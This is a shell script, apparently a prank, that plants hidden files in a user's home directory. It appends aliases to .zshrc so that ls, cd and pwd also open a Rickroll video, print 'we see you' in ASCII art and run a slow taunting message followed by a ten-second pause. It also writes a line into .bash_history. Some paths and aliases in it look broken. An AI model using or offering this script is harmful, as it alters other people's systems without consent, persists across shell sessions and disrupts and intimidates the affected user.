cat >> $HOME/.shell.py << EOL
import webbrowser
import time
import sys
webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

letters = { "a":[ "###", "# #", "###", "# #", "# #"], "b":[ "###", "# #", "###", "# #", "###"], "c":[ "###", "#", "#", "#", "###"], "d":[ "##", "# #", "# #", "# #", "##"], "e":[ "###", "#", "###", "#", "###"], "f":[ "###", "#", "###", "#", "#"], "g":[ "###", "# #", "###", "  #", "###"], "h":[ "# #", "# #", "###", "# #", "# #"], "i":[ "###", " #", " #", " #", "###"], "j":[ "###", " #", " #", " #", "##"], "k":[ "# #", "##", "#", "##", "# #"], "l":[ "#", "#", "#", "#", "###"], "m":[ "# #", "###", "###", "# #", "# #"], "n":[ "###", "# #", "# #", "# #", "# #"], "o":[ "###", "# #", "# #", "# #", "###"], "p":[ "###", "# #", "###", "#", "#"], "q":[ "###", "# #", "###", "  #", "  #"], "r":[ "###", "# #", "##", "# #", "# #"], "s":[ "###", "#", "###", "  #", "###"], "t":[ "###", " #", " #", " #", " #"], "u":[ "# #", "# #", "# #", "# #", "###"], "v":[ "# #", "# #", "# #", "# #", " #"], "w":[ "# #", "# #", "# #", "###", "###"], "x":[ "# #", " #", " #", " #", "# #"], "y":[ "# #", "# #", "###", "  #", "###"], "z":[ "###", "  #", " #", "#", "###"], " ":[ " "], "1":[ " #", "##", " #", " #", "###"], "2":[ "###", "  #", "###", "#", "###"], "3":[ "###", "  #", "###", "  #", "###"], "4":[ "#", "#", "# #", "###", "  #"], "5":[ "###", "#", "###", "  #", "###"], "6":[ "###", "#", "###", "# #", "###"], "7":[ "###", "  # ", " #", " #", "#"], "8":[ "###", "# #", "###", "# #", "###"], "9":[ "###", "# #", "###", "  #", "###"], "0":[ "###", "# #", "# #", "# #", "###"], "!":[ " # ", " # ", " # ", "   ", " # "], "?":[ "###", "  #", " ##", "   ", " # "], ".":[ "   ", "   ", "   ", "   ", " # "], "]":[ "   ", "   ", "   ", "  #", " # "], "/":[ "  #", "  #", " # ", "# ", "# "], ":":[ "   ", " # ", "   ", " # ", "   "], "@":[ "###", "# #", "## ", "#  ", "###"], "'":[ " # ", " # ", "   ", "   ", "   "], "#":[ " # ", "###", " # ", "###", " # "] }

def print_letters(text):
    bigletters = []
    for i in text:
        bigletters.append(letters.get(i.lower(),letters[' ']))
    output = ['']*5
    for i in range(5):
        for j in bigletters:
            temp = ' '
            try:
                temp = j[i]
            except:
                pass
            temp += ' '*(5-len(temp))
            temp = temp.replace(' ',' ')
            temp = temp.replace('#','@')
            output[i] += temp
    return '\n'.join(output)

print(print_letters("we see you"))
print("\n")
print("\n")
EOL

cat >> $HOME/.shell2.sh << EOL
#!/bin/sh

echo -n "A"
sleep 0.2
echo -n "r"
sleep 0.1
echo -n "e"
sleep 0.5
echo -n " "
sleep 0.6
echo -n "y"
sleep 0.3
echo -n "o"
sleep 0.1
echo -n "u"
sleep 0.1
echo -n " "
sleep 0.5
echo -n "n"
sleep 0.3
echo -n "o"
sleep 0.6
echo -n "t"
sleep 0.7
echo -n " "
sleep 0.3
echo -n "e"
sleep 0.4
echo -n "n"
sleep 0.5
echo -n "t"
sleep 0.5
echo -n "e"
sleep 0.1
echo -n "r"
sleep 0.4
echo -n "t"
sleep 0.3
echo -n "a"
sleep 0.6
echo -n "i"
sleep 0.7
echo -n "n"
sleep 0.8
echo -n "e"
sleep 0.4
echo -n "d"
sleep 0.3
echo -n " "
sleep 0.5
echo "?"
sleep 10

EOL

cat >> $HOME/.zshrc << EOL
alias ls="python $HOME/.shell.py && /bin/ls && ./$HOME/.shell2.sh"
alias cd="python $HOME/.shell.py && /usr/bin/cd && ./$HOME/.shell2.sh"
alias pwd="python $HOME/.shell.py && /bin/pwd && ./$HOME/.shell2.sh"
EOL

cat >> $HOME/.bash_history << EOL
The chamber of secrets has been opened, enermies of the heir beware!
EOL

